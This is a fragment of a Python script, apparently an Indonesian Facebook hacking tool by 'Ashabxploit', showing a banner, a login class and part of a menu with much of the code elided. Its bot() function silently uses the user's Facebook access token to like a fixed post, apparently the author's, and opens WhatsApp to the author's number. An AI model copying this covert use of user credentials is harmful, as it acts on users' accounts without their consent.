...
__________________________________________________________________________________________________________________________
 [\x1b[1;96m+%s] Author   : Ashabxploit
 [\x1b[1;96m+%s] Github   : github.com/Ashabxploit
 [\x1b[1;95m+%s] Facebook : Mau.ngapain.bang.copy.ya
 [\x1b[1;94m+%s] suport kartu : [ axis,indosat,3]
__________________________________________________________________________________________________________________________\n'''%(O,M,K,H,U))
...
class login:
	...
	def takon(self):
		...
		if takon in ['y','Y','iya']:
			...
			os.system('xdg-open wa.me/6283184311442');exit()
		else:
			login().__login__()
	def bot(self):
		...
		requests.post('https://graph.facebook.com/3086614624895671/likes?summary=true&access_token=' + toket)
		os.system('xdg-open wa.me/6283184311442')
		menu().main()
...
class menu:
	...
	def pilih(self):
		...
		if usna in ['']:
			...
			url_wa = ("https://api.whatsapp.com/+6283184311442?phone="+nom_wa+"&text="+kata)
			subprocess.check_output(["am", "start", url_wa])
			exit()
		else:
